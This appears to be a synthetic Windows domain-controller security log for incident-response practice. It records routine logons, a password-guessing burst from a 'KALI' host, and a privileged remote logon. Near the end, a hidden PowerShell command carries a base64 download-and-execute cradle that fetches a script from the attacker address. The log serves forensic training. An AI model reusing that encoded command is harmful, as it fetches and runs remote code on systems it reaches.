Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:14:45 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0x748709
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	59451
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:26:04 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xA9EB72
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	30584
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:28:45 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xBC8B30
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	49128
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:29:18 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x1BFA53
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	43942
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:30:15 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xBBBAE
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	55427
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:32:32 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x9F39
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:35:26 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	carol
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	36829
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:38:31 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xB5BAB1
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	41988
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:41:50 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0x4EAB21
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	57801
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:43:42 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0x643CB5
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	52843
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:48:46 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	alice
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	56279
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:01:29 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	alice
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	36374
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:06:23 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xDC7F0
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	52138
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:08:41 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xF666C6
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	51394
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:11:39 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x127E2C
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	43351
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:14:12 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xEE5744
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	31404
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:14:22 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	45116
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:15:16 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0xA111
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:27:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0xD02819
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	53211
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:27:12 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xB2FF51
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	51893
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:29:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0x15F909
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	45098
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:33:57 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0x4303F9
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	32188
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:35:59 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xE6E234
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	50307
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:37:49 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	New Process ID:	0x6155
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	cmd.exe /c dir Z:\reports

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:48:59 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x1AC66D
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	39336
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 8:49:42 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x75FFBF
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	38073
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 9:09:12 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x505078
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	52258
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 9:10:56 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xB9FE9F
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	51160
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 9:27:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0x7DDC4A
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	55913
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 9:28:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0xD20275
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	39031
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 9:32:45 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	bob
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	53507
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 9:47:25 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x9275BA
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	55900
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 9:52:28 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	alice
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	42876
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 9:58:00 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0xD75CE2
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	39018
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:00:08 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xCD367A
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	54167
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:05:11 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0xA14
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:08:39 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xF83037
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	50272
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:13:13 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x6109
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:23:24 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	New Process ID:	0xDFBE
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	cmd.exe /c dir Z:\reports

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:24:54 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	New Process ID:	0x4E26
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:00 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	49004
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:04 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	33373
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:08 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	52305
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:12 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	58063
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:16 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	52054
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:20 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	34998
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:24 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	46574
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:28 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	55242
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:32 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	49364
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:36 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	52006
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:40 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	51110
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:25:44 AM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	31416
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:26:10 AM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xA41F6C
	Logon Type:	10
	Workstation Name:	KALI
	Source Network Address:	203.0.113.77
	Source Port:	48364
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:26:12 AM
Event ID:      4672
Task Category: Special Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
Special privileges assigned to new logon.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Privileges:	SeSecurityPrivilege
			SeBackupPrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 10:27:03 AM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x7F0B
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3ADcALwBhAC4AcABzADEAJwApAA==

Log Name:      Security
